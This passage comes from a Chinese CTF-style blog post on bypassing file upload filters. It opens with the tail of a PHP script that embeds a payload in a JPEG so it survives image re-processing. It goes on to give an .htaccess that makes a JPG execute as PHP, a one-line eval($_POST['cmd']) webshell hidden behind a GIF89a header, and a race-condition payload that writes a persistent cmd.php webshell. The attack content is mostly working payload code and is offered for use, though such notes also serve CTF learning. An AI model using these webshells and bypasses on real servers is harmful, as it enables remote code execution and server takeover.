invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                       <span class="hljs-variable">$miniPayload</span> . <br>                       <span class="hljs-title function_ invoke__">substr</span>(<br>                           <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                               <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                           <span class="hljs-number">0</span>,<br>                           <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                               <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>               &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                   <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">break</span>;<br>               &#125;<br>               <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">break</span>;<br>               &#125;<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>       <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>       <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>       <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>           <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>       <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>               <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>           &#125;<br>       &#125;<br>   &#125;<br><br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>           <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>               <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>               <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>           &#125;<br>           <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>           &#125;<br>           <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>           &#125;<br>           <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>               <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>       &#125;<br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>具体看代码逻辑</p>
+<p>  move_uploaded_file和rename_file不允许\x00, 不能采用00截断的方法<br>  必须是一个有效路径， a.php.也不行了 （可能与php版本有关）<br>  但是a.php&#x2F;.可以，并保存为a.php</p>
+</li>
+</ul>
+<h3 id="2-MIME类型检测"><a href="#2-MIME类型检测" class="headerlink" title="2. MIME类型检测"></a>2. MIME类型检测</h3><pre><code class="hljs">直接在burpsuite里面改
+</code></pre>
+<h3 id="3-文件头检测"><a href="#3-文件头检测" class="headerlink" title="3. 文件头检测"></a>3. 文件头检测</h3><pre><code class="hljs">加上GIF89A (会使得.htaccess失效)
+</code></pre>
+<h3 id="4-配置文件覆盖"><a href="#4-配置文件覆盖" class="headerlink" title="4. 配置文件覆盖"></a>4. 配置文件覆盖</h3><pre><code class="hljs">上传.ini文件或者.htaccess文件。
+</code></pre>
+<p><strong>.htaccess文件不要有 GIF89A ！！！</strong><br><strong>不然会报语法错误500！！</strong><br>解决方法： 用注释符(#,\x00)并自定义宽高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">#define width 1<br>#define height 1<br>&lt;FilesMatch &quot;1.jpg&quot;&gt;  <br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
+<p>可以绕过getimagesize和exif_imagetype</p>
+<h3 id="5-文件内容过滤"><a href="#5-文件内容过滤" class="headerlink" title="5. 文件内容过滤"></a>5. 文件内容过滤</h3><p>a. 过滤&lt;?   –&gt;   script 绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-title function_ invoke__">phpinfo</span>();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>b. 有时还会碰到这种奇葩条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ol>
+<li>白名单</li>
+<li>先传到服务器再删除</li>
+<li>文件上传路径已知<br><strong>payload</strong></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cmd.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>一手发包，一手访问上传的文件<br>如果上传的文件还没被删除，就被访问到，那么这段代码就会生成一个cmd.php，从而访问cmd.php得到webshell</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件上传</div>
+      <div>http://mekrina.github.io/blogs/文件上传/文件上传/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/" title="拿到题目后的思路">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">拿到题目后的思路</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/" title="无数字字母RCE">
+                        <span class="hidden-mobile">无数字字母RCE</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/blogs/js/events.js" ></script>
+<script  src="/blogs/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/blogs/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/blogs/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/blogs/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
